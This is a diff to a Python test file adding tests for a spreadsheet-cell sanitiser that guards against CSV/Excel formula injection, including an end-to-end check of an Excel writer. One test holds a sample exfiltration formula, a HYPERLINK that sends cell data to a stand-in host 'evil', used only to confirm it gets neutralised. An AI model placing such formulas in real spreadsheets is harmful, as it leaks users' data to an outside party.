@@ -7,6 +7,7 @@ from app.core.security import (
     decode_token,
     get_password_hash,
     mask_iban,
+    sanitize_spreadsheet_cell,
     verify_password,
 )
 
@@ -132,3 +133,47 @@ class TestMaskIban:
         result = mask_iban(text)
         assert "ES** **** **** **** **** 1332" in result
         assert "ES** **** **** **** **** 0123" in result
+
+
+class TestSanitizeSpreadsheetCell:
+    """Anti CSV/Excel formula injection (sanitize_spreadsheet_cell)."""
+
+    def test_formula_igual_prefijada(self):
+        assert sanitize_spreadsheet_cell("=1+1") == "'=1+1"
+
+    def test_hyperlink_exfil_prefijado(self):
+        payload = '=HYPERLINK("http://evil/?"&A1,"x")'
+        assert sanitize_spreadsheet_cell(payload) == "'" + payload
+
+    def test_todos_los_triggers(self):
+        for ch in ("=", "+", "-", "@", "\t", "\r"):
+            assert sanitize_spreadsheet_cell(ch + "cmd") == "'" + ch + "cmd"
+
+    def test_texto_normal_intacto(self):
+        assert sanitize_spreadsheet_cell("Acme SL") == "Acme SL"
+
+    def test_no_str_intacto(self):
+        assert sanitize_spreadsheet_cell(42) == 42
+        assert sanitize_spreadsheet_cell(None) is None
+
+    def test_str_vacio_intacto(self):
+        assert sanitize_spreadsheet_cell("") == ""
+
+    def test_writer_escribe_celda_saneada(self):
+        """End-to-end: el writer central escribe la celda ya prefijada."""
+        import os
+        import tempfile
+
+        import openpyxl
+        import pandas as pd
+
+        from app.agents.excel._writer import _write_excel
+
+        df = pd.DataFrame({"Cliente": ["=1+1", "Acme SL"]})
+        with tempfile.TemporaryDirectory() as d:
+            path = os.path.join(d, "out.xlsx")
+            _write_excel({"Hoja": df}, path)
+            wb = openpyxl.load_workbook(path)
+            ws = wb["Hoja"]
+            assert ws.cell(row=2, column=1).value == "'=1+1"  # saneada
+            assert ws.cell(row=3, column=1).value == "Acme SL"  # intacta
